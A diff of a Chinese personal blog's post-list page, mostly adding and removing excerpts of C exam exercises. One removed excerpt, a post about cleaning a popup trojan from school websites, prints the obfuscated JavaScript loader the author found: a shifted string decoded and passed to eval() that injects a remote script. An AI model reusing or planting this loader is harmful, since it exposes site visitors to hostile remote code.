@@ -63,13 +63,6 @@
 			</a>
 		</li>
 		<li class="menu__item">
-			<a class="menu__link" href="/post/llm_develop_tools/">
-				
-				<span class="menu__text">Article</span>
-				
-			</a>
-		</li>
-		<li class="menu__item">
 			<a class="menu__link" href="/about/">
 				
 				<span class="menu__text">About</span>
@@ -88,6 +81,40 @@
 	<header class="main__header">
 		<h1 class="main__title">Posts</h1>
 	</header><article class="list__item post">
+	
+	<header class="list__header">
+		<h2 class="list__title post__title">
+			<a href="/post/1997-c-%E4%BA%8C/" rel="bookmark">
+			1997-c-二
+			</a>
+		</h2>
+		<div class="list__meta meta">
+<div class="meta__item-datetime meta__item">
+	<svg class="meta__icon icon icon-time" width="16" height="14" viewBox="0 0 30 28"><path d="M15 0C7 0 1 6 1 14s6 14 14 14 14-6 14-14S23 0 15 0zm0 25C9 25 4 20 4 14S9 3 15 3s11 5 11 11-5 11-11 11zm1-18h-2v8.4l6.8 4.4L22 18l-6-3.8V7z"/></svg><time class="meta__text" datetime="2016-10-04T00:00:00Z">October 04, 2016</time></div><div class="meta__item-categories meta__item"><svg class="meta__icon icon icon-category" width="16" height="16" viewBox="0 0 16 16"><path d="m7 2l1 2h8v11h-16v-13z"/></svg><span class="meta__text"><a class="meta__link" href="/categories/%E4%B8%9C%E5%8C%97%E5%A4%A7%E5%AD%A6842%E8%80%83%E7%A0%94/" rel="category">东北大学842考研</a>
+	</span>
+</div></div>
+	</header>
+	<div class="content list__excerpt post__content clearfix">
+		#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;//向量 typedef struct Vector { int x; int y; }Vector; //坐标点 typedef struct Point { int x; int y; }Point; //判断两向量是否共线，不共线即可构成三角形 int triangle(Vector v[]) { if(v[0].x*v[1].y == v[1].x*v[0].y) return 0;//共线、不能构成三角形  else return 1; } //将三点坐标转换为两个向量的坐标 void change(Point p[],Vector v[]) { v[0].x = p[0].x-p[1].x; v[0].y = p[0].y-p[1].y; v[1].x = p[0].x-p[2].x; v[1].y = p[0].y-p[2].y; } int main() { int n;//坐标点总数  int i,j,k;//循环变量  Point m[3];//三个点  Vector l[2];//两个向量  printf(&#34;请输入坐标点个数：\n&#34;);//输入坐标点个数  scanf(&#34;%d&#34;,&amp;n); Point *p = (Point*)malloc(sizeof(Point)*n);//分配点存储空间  for(i=0;i&lt;n;i++) { printf(&#34;请输入第%d个坐标：\n&#34;,i); scanf(&#34;%d,%d&#34;,&amp;p[i].
+	</div>
+</article><article class="list__item post">
+	
+	<header class="list__header">
+		<h2 class="list__title post__title">
+			<a href="/post/1997-d-%E5%85%AD/" rel="bookmark">
+			1997-d-六
+			</a>
+		</h2>
+		<div class="list__meta meta">
+<div class="meta__item-datetime meta__item">
+	<svg class="meta__icon icon icon-time" width="16" height="14" viewBox="0 0 30 28"><path d="M15 0C7 0 1 6 1 14s6 14 14 14 14-6 14-14S23 0 15 0zm0 25C9 25 4 20 4 14S9 3 15 3s11 5 11 11-5 11-11 11zm1-18h-2v8.4l6.8 4.4L22 18l-6-3.8V7z"/></svg><time class="meta__text" datetime="2016-10-04T00:00:00Z">October 04, 2016</time></div><div class="meta__item-categories meta__item"><svg class="meta__icon icon icon-category" width="16" height="16" viewBox="0 0 16 16"><path d="m7 2l1 2h8v11h-16v-13z"/></svg><span class="meta__text"><a class="meta__link" href="/categories/%E4%B8%9C%E5%8C%97%E5%A4%A7%E5%AD%A6842%E8%80%83%E7%A0%94/" rel="category">东北大学842考研</a>
+	</span>
+</div></div>
+	</header>
+	<div class="content list__excerpt post__content clearfix">
+		// 先序遍历树中每个节点 int visit( int T[],int n,int id) { if(id &gt; n) return 0; printf(&#34;%d&#34;,id); visit(T,n,id*2); visit(T,n,id*2+1); } //打印全部祖先结点 int print_ancestor(int T[],int n) { int parent = 0; parent = n/2; while(parent &gt;0) { printf(&#34;%d&#34;,parent); parent = parent/2; } } 
+	</div>
+</article><article class="list__item post">
 	
 	<header class="list__header">
 		<h2 class="list__title post__title">
@@ -223,49 +250,13 @@
 	<div class="content list__excerpt post__content clearfix">
 		#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt; #define MAXSIZE 100  int main() { int reverse_string(char *string);//函数原型声明  char str[MAXSIZE];//数组最大下标  scanf(&#34;%s&#34;, str); printf(&#34;%s\n&#34;, str); reverse_string(str); } int reverse_string(char *string) { char *tail = NULL; char *head = NULL; head = string; tail = string; while(*(++tail));//调整tail指针指向字符串尾部  tail--;//在while判断时多移动一个位置  printf(&#34;*head:%c\n&#34;, *head); printf(&#34;*tail:%c\n&#34;, *tail); while ((tail &gt;= head) &amp;&amp; (*tail== *head)) { //当前位置对称，指针往后移动  //不对称，或者尾指针小于头指针，就结束比较  tail--; head++; } //尾指针大于等于头指针，说明不是回文  //因为没有比较完字符串中的所有元素就中断了循环，存在*tail ！= *head的情况  if (tail &gt;= head) { printf(&#34;Not reverse string.
 	</div>
-</article><article class="list__item post">
-	
-	<header class="list__header">
-		<h2 class="list__title post__title">
-			<a href="/post/1994-%E5%9B%9B/" rel="bookmark">
-			1996-c-四
-			</a>
-		</h2>
-		<div class="list__meta meta">
-<div class="meta__item-datetime meta__item">
-	<svg class="meta__icon icon icon-time" width="16" height="14" viewBox="0 0 30 28"><path d="M15 0C7 0 1 6 1 14s6 14 14 14 14-6 14-14S23 0 15 0zm0 25C9 25 4 20 4 14S9 3 15 3s11 5 11 11-5 11-11 11zm1-18h-2v8.4l6.8 4.4L22 18l-6-3.8V7z"/></svg><time class="meta__text" datetime="2016-09-18T00:00:00Z">September 18, 2016</time></div><div class="meta__item-categories meta__item"><svg class="meta__icon icon icon-category" width="16" height="16" viewBox="0 0 16 16"><path d="m7 2l1 2h8v11h-16v-13z"/></svg><span class="meta__text"><a class="meta__link" href="/categories/%E4%B8%9C%E5%8C%97%E5%A4%A7%E5%AD%A6842%E8%80%83%E7%A0%94/" rel="category">东北大学842考研</a>
-	</span>
-</div></div>
-	</header>
-	<div class="content list__excerpt post__content clearfix">
-		//基本思想生成一条新串，不是在原有串上进行复杂操作
-int delsubStr(char* str_in,char* str_sub, char* str_out) { int start = 0; /* 记录开始比较下标 */ int count = 0; /* 记录子串个数 */ int j = 0; /* 记录子串的下标 */ int k = 0; /* 记录结果字符串的下标 */ int i; /*循环变量*/ for (i = 0; str_in[i] != &#39;\0&#39;; i++) { start = i; /* 临时保存比较下标 */ j = 0; /* 每次开始比较的时候，子串都从0开始,如果第一个字符相等， 那么就接着比较下一个字符，否则进入下一轮循环 */ while ((str_in[i] != &#39;\0&#39;)&amp;&amp;(str_sub[j] != &#39;\0&#39;)&amp;&amp;(str_in[i] == str_sub[j])) { i++; /* 源串后移一个位置 */ j++; /* 字串后移一个位置 */ } if (str_sub[j] !
-	</div>
-</article><article class="list__item post">
-	
-	<header class="list__header">
-		<h2 class="list__title post__title">
-			<a href="/post/js%E6%9C%A8%E9%A9%AC/" rel="bookmark">
-			js木马
-			</a>
-		</h2>
-		<div class="list__meta meta">
-<div class="meta__item-datetime meta__item">
-	<svg class="meta__icon icon icon-time" width="16" height="14" viewBox="0 0 30 28"><path d="M15 0C7 0 1 6 1 14s6 14 14 14 14-6 14-14S23 0 15 0zm0 25C9 25 4 20 4 14S9 3 15 3s11 5 11 11-5 11-11 11zm1-18h-2v8.4l6.8 4.4L22 18l-6-3.8V7z"/></svg><time class="meta__text" datetime="2015-12-31T00:00:00Z">December 31, 2015</time></div><div class="meta__item-categories meta__item"><svg class="meta__icon icon icon-category" width="16" height="16" viewBox="0 0 16 16"><path d="m7 2l1 2h8v11h-16v-13z"/></svg><span class="meta__text"><a class="meta__link" href="/categories/%E6%97%A5%E5%B8%B8/" rel="category">日常</a>
-	</span>
-</div></div>
-	</header>
-	<div class="content list__excerpt post__content clearfix">
-		最近发现学校的多个站点，中了弹窗木马，费了好大劲，清完了，同时缴获php大马一枚，还不错。。。
-木马代码
-var str=&#34;cnbtldms-vqhsd&#39;!;rbqhosrqb&lt;[!gsso9..vvv-fnnfkd`crk-bnl.robncd.iptdqx-ir[!=;.rbqhos=!(:&#34;;var length=str.length;var ba64=&#34;&#34;;for(i=0;i&lt;length;i++){var s=str.charCodeAt(i);s++;ba64=ba64+String.fromCharCode(s)}eval(ba64); 木马程序就不上传了，哈哈
-	</div>
 </article>
 </main>
 
 <div class="pagination">
 	<a class="pagination__item pagination__item--prev btn" href="/post/page/8/">«</a>
-	<span class="pagination__item pagination__item--current">9/9</span>
+	<span class="pagination__item pagination__item--current">9/10</span>
+	<a class="pagination__item pagination__item--next btn" href="/post/page/10/">»</a>
 </div>
 
 			</div>
@@ -278,8 +269,8 @@ var str=&#34;cnbtldms-vqhsd&#39;!;rbqhosrqb&lt;[!gsso9..vvv-fnnfkd`crk-bnl.rob
 			<li class="widget__item"><a class="widget__link" href="/docs/seechat/">SeeChat</a></li>
 			<li class="widget__item"><a class="widget__link" href="/docs/842/">842</a></li>
 			<li class="widget__item"><a class="widget__link" href="/post/llm_develop_tools/">LLM Develop Tools</a></li>
-			<li class="widget__item"><a class="widget__link" href="/post/%E6%88%91%E7%9A%84%E8%80%83%E7%A0%94%E8%B7%AF/">我的考研路</a></li>
-			<li class="widget__item"><a class="widget__link" href="/post/2006-%E4%B8%80-4/">2006-一-4</a></li>
+			<li class="widget__item"><a class="widget__link" href="/post/%E5%AF%B9%E5%BD%A9%E7%A4%BC%E7%9A%84%E7%90%86%E8%A7%A3/">对彩礼的理解</a></li>
+			<li class="widget__item"><a class="widget__link" href="/post/%E5%AF%B9%E7%BB%9F%E6%B2%BB%E4%B8%8E%E8%A2%AB%E7%BB%9F%E6%B2%BB%E7%9A%84%E7%90%86%E8%A7%A3/">对统治与被统治的理解</a></li>
 		</ul>
 	</div>
 </div>
@@ -306,6 +297,7 @@ var str=&#34;cnbtldms-vqhsd&#39;!;rbqhosrqb&lt;[!gsso9..vvv-fnnfkd`crk-bnl.rob
 		<a class="widget-taglist__link widget__link btn" href="/tags/php/" title="php">php</a>
 		<a class="widget-taglist__link widget__link btn" href="/tags/semantic-kernel/" title="semantic-kernel">semantic-kernel</a>
 		<a class="widget-taglist__link widget__link btn" href="/tags/%E4%B8%9C%E5%8C%97%E5%A4%A7%E5%AD%A6842%E8%80%83%E7%A0%94/" title="东北大学842考研">东北大学842考研</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/%E6%97%A5%E5%B8%B8/" title="日常">日常</a>
 		<a class="widget-taglist__link widget__link btn" href="/tags/%E6%9C%A8%E9%A9%AC/" title="木马">木马</a>
 	</div>
 </div>
